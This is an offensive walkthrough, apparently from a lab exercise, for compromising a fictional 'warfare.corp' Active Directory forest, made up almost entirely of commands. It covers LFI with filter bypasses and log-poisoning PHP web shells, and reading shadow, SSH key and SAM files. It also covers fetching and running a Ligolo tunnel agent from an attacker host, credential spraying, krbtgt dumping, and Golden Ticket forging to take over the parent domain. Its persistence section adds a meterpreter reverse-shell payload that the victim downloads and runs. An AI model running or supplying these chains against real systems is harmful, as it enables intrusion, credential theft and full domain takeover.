## Full Documentation: Privilege Escalation and Pivoting in Active Directory (EN)

### 1. Network and Port Scanning with Nmap

```bash
nmap -sV 192.168.80.10
```

Port 80 is open — access the web server via browser.

### 2. Web Vulnerability Enumeration

* **LFI**: 

```bash
# ✅ Basic LFI Examples
curl "http://target/index.php?page=../../../../etc/passwd"
curl "http://target/index.php?page=../../../../windows/win.ini"
curl "http://target/index.php?page=../../../../var/log/apache2/access.log"

# 🔐 Bypass Filters
curl "http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd"          # URL encoded
curl "http://target/index.php?page=..%252f..%252fetc%252fpasswd"        # Double encoded
curl "http://target/index.php?page=../../../../etc/passwd%00"           # Null byte (old PHP)

# 🐚 LFI to RCE via Log Poisoning
# Step 1: Inject PHP via User-Agent header (access.log poisoning)
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target/"
# Step 2: Include poisoned log to execute
curl "http://target/index.php?page=../../../../var/log/apache2/access.log&cmd=id"

# 🧑‍💻 Session Hijacking via LFI
curl "http://target/index.php?page=/var/lib/php/sessions/sess_abcd1234"

# ☠️ File Upload + LFI to RCE
# Upload image with embedded PHP code, then include it
curl "http://target/index.php?page=../../uploads/shell.jpg&cmd=id"

# 🌀 PHP Wrappers (if allow_url_include=On)
curl "http://target/index.php?page=php://filter/convert.base64-encode/resource=index.php"
curl "http://target/index.php?page=data:text/plain,<?php system(\$_GET['cmd']); ?>&cmd=id"

# 📁 Target Files (Linux/Windows)
curl "http://target/index.php?page=/etc/passwd"
curl "http://target/index.php?page=/etc/shadow"
curl "http://target/index.php?page=/etc/hostname"
curl "http://target/index.php?page=/home/user/.ssh/id_rsa"
curl "http://target/index.php?page=C:/Windows/win.ini"
curl "http://target/index.php?page=C:/Windows/System32/config/SAM"
```

* **Directory Brute-force**:

```bash
dirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt
feroxbuster -u http://192.168.80.10 -w /home/miquela/wordlist/medium.txt
gobuster dir -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt
```

Goal: find sensitive info such as admin credentials.

### 3. Log into Web Server via SSH

```bash
ssh privilege@192.168.80.10
```

### 4. Post-Access Enumeration

```bash
whoami
hostname
id
sudo -l
sudo id
```

### 5. Check Network Info

```bash
ifconfig
ip a
ip r
route -n
netstat
```

### 6. Searching for Sensitive Files

```bash
sudo grep -Rni "free string" / 2>/dev/null
grep -Ril "free string" / 2>/dev/null
find / -type f -iname "free_string" 2>/dev/null
```

Example: `places.sqlite`

```bash
cd ~/.mozilla/firefox/<profile-folder>
sqlite3 places.sqlite
.tables
select * from moz_bookmarks;
```

Found link: `http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6`

### 7. Set Up Tunnel Using Ligolo-ng

**Attacker:**

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert
```

**Pivot Machine:**

```bash
wget http://10.10.200.23:8000/agent
chmod +x agent
./agent -connect 10.10.200.23:11601 -ignore-cert
```

**Attacker:**

```bash
start
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
sudo ip route add 192.168.98.0/24 dev ligolo
```

### 8. Enumerate Internal Network

```bash
nmap -sn 192.168.98.0/24
ping 192.168.98.2
cat target.txt
192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120
```

### 9. Credential Spray with CME & LSA Dump

```bash
crackmapexec smb target.txt -u john -p 'User1@#$%6'
crackmapexec smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa
```

Repeat with other credentials:

```bash
crackmapexec smb target.txt -u corpmngr -p 'User4&*&*'
```

### 10. Add to /etc/hosts

```bash
192.168.98.2 warfare.corp dc01.warfare.corp
192.168.98.120 child.warfare.corp cdc.child.warfare.corp
```

### 11. Dump krbtgt Hash

```bash
secretsdump.py -debug child/corpmngr@192.168.98.120 -hashes :4cb3933610b827a281ec479031128cc6 -just-dc-user 'child\krbtgt'
```

Or:

```bash
secretsdump.py -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'
```

### 12. Get Domain SIDs

```bash
lookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp
lookupsid.py child/corpmngr:'User4&*&*'@warfare.corp
```

### 13. Golden Ticket Attack

```bash
impacket-ticketer -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 \
-domain child.warfare.corp \
-domain-sid S-1-5-21-3754860944-83624914-1883974761 \
-extra-sid S-1-5-21-3375883379-808943238-3239386119-519 Administrator
export KRB5CCNAME=Administrator.ccache
```

### 14. Time Synchronization

```bash
sudo apt install ntpsec-ntpdate -y
sudo ntpdig -S 192.168.98.2
```

### 15. Request Service Ticket & Dump Hash

```bash
getST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/Administrator
export KRB5CCNAME=Administrator@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
secretsdump.py -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator'
```

### 16. Access Parent Domain Controller

```bash
psexec.py child.warfare.corp/Administrator@dc01.warfare.corp -k -no-pass -target-ip 192.168.98.2
```

Or using hash:

```bash
psexec.py -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:c20a43b71503528c05c57fcbff0c78e3
```

---

## Persistence Techniques

### Upload Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.98.15 lport=1234 -f exe -o rev.exe
```

### On Pivot Machine

```bash
ssh privilege@192.168.80.10
./agent -connect 10.10.200.23:11601 -ignore-cert
```

### On Attacker:

```bash
ligolo-proxy -selfcert
start
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4321
```

### Upload to Victim

```powershell
powershell
Invoke-WebRequest http://192.168.98.15:1237/payloads.exe -OutFile C:\Users\corpmngr\Downloads\payloads.exe
cd C:\Users\corpmngr\Downloads
```

### Start Handler on Kali

```bash
msfconsole
use exploit/multi/handler
set lhost 0.0.0.0
set lport 4321
set payload windows/x64/meterpreter/reverse_tcp
run
```

### Execute Payload on Victim

```powershell
.\payloads.exe
```

---

### Lateral Movement & Privilege Escalation to Parent

1. Extract credentials using `creds_all` (meterpreter / kiwi).
2. Get DC info:

```powershell
Get-ADDomainController -Server child.warfare.corp
Get-ADForest
```

3. Get SID for child/parent:

```powershell
Get-DomainSID -Domain child.warfare.corp
Get-DomainSID -Domain warfare.corp
```

4. Golden Ticket using ticketer:

```bash
impacket-ticketer -aesKey <AESKEY> -domain child.warfare.corp -domain-sid <CHILD_SID> -extra-sid <PARENT_SID>-519 Administrator
```

---

### Required Tools to Upload to Victim:

* `agent`
* `payload.exe`
* `mimikatz.exe`
* `PowerView.ps1`

Import PowerView in powershell victim:

```powershell
powershell
Import-Module .\PowerView.ps1
```

